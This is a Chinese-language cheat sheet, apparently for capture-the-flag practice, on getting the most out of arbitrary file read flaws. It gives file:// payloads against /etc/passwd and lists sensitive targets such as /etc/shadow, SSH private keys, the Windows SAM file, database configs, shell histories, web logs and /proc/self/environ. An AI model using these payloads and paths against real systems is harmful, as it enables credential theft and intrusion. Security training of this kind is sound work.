url=file://127.0.0.1/etc/passwd
url=file:///etc/passwd

任意⽂件读取漏洞利⽤

当我们遇到任意⽂件读取漏洞的时候，我们需要考虑如何通过这⼀个⼩点去扩⼤我们的成果，达到最⼤化利⽤的⽬的

猜测 flag 路径:

⽤户⽬录下的敏感⽂件：

```sh
/flag
/flag.txt
/home/xxx/flag
/root/flag
/root/flag.txt
/root/root.txt
/var/www/html/flag_xxxxx
......
C:/Users/Administrator/Desktop/flag.txt
```

Windows:

```bash
C:\boot.ini //查看系统版本
C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置⽂件
C:\Windows\repair\sam //存储系统初次安装的密码
C:\Program Files\mysql\my.ini //Mysql配置
C:\Program Files\mysql\data\mysql\user.MYD //Mysql root
C:\Windows\php.ini //php配置信息
C:\Windows\my.ini //Mysql配置信息
```

Linux

```bash
/root/.ssh/authorized_keys //如需登录到远程主机，需要到.ssh⽬录下，新建authorized_keys⽂件，并
将id_rsa.pub内容复制进去
/root/.ssh/id_rsa //ssh私钥,ssh公钥是id_rsa.pub
/root/.ssh/id_ras.keystore //记录每个访问计算机⽤户的公钥
/root/.ssh/known_hosts
//ssh会把每个访问过计算机的公钥(public key)都记录在~/.ssh/known_hosts。当下次访问相同计算机时，
OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。
/etc/passwd // 账户信息
/etc/shadow // 账户密码⽂件
/etc/my.cnf //mysql 配置⽂件
/etc/httpd/conf/httpd.conf // Apache配置⽂件
/etc/redhat-release 系统版本
/root/.bash_history //⽤户历史命令记录⽂件
```

⽤户⽬录下的敏感⽂件：

```bash
/home/xxx/.bash_history
/home/xxx/.zsh_history
/home/xxx/.psql_history
/home/xxx/.mysql_history
/home/xxx/.profile
/home/xxx/.bashrc
/home/xxx/.gitconfig
/home/xxx/.viminfo
```

应⽤⽇志⽂件路径:

```bash
tomcat
/tomcat/bin/catalina.sh，⾥边有log的配置路径
/webapps/ROOT/logs/catalina.out
apache
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log
/etc/httpd/logs/access_log
/etc/httpd/logs/error_log
/etc/httpd/logs/error.log
nginx
/var/log/nginx/access.log
/var/log/nginx/error.log
/usr/local/var/log/nginx/access.log
/usr/local/nginx/logs
```

# /proc

/proc/self/environ # 环境变量

| params  | Desc                                                                                         |
| ------- | -------------------------------------------------------------------------------------------- |
| cmdline | ⽂件存储着启动当前进程的完整命令                                                             |
| cwd     | ⽂件是⼀个指向当前进程运⾏⽬录的符号链接                                                     |
| exe     | 是⼀个指向启动当前进程的可执⾏⽂件（完整路径）的符号链接                                     |
| environ | 进程环境变量，彼此间⽤空字符（NULL）隔开。变量⽤⼤写字⺟表                                   |
| fd      | 此目录包含这当前进程打开的每⼀个⽂件的⽂件描述符（file descriptor）,可能含有被删除文件的内容 |
